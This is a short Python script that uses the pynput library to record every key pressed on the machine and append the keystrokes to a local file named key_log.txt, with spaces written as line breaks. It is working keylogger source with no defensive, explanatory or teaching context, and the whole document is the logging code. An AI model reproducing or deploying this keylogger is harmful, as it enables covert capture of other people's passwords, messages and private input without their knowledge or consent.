
import pynput
from pynput.keyboard import Key, Listener

keys = []
def press(key):
    global keys
    keys.append(key)
    write_file(keys)
    keys =[]
def release(key):
    pass

def write_file(keys):
    with open("key_log.txt", "a") as f:
        for key in keys:
            if key == Key.space:
                f.write('\n')
            elif hasattr(key, 'char'):
                f.write(key.char)
            else:
                f.write(str(key))

with Listener(on_press=press, on_release=release) as listener:
    listener.join()